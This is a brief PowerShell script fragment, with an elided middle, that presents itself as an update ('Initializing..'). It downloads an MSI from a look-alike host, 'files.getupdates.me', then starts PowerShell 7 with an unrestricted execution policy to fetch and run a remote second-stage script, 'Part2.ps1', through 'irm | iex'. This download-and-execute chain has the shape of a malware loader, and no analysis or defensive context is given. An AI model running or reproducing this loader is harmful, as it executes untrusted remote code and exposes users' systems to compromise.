echo "Initializing.."
Invoke-WebRequest -Uri "https://files.getupdates.me/PowerShell-7.4.3-win-x86.msi" -OutFile Pwsh.msi
...
Start-Process -FilePath "C:\Program Files (x86)\Powershell\7\pwsh.exe" -ArgumentList "-ExecutionPolicy Unrestricted -C irm https://getupdates.me/Part2.ps1 | iex"
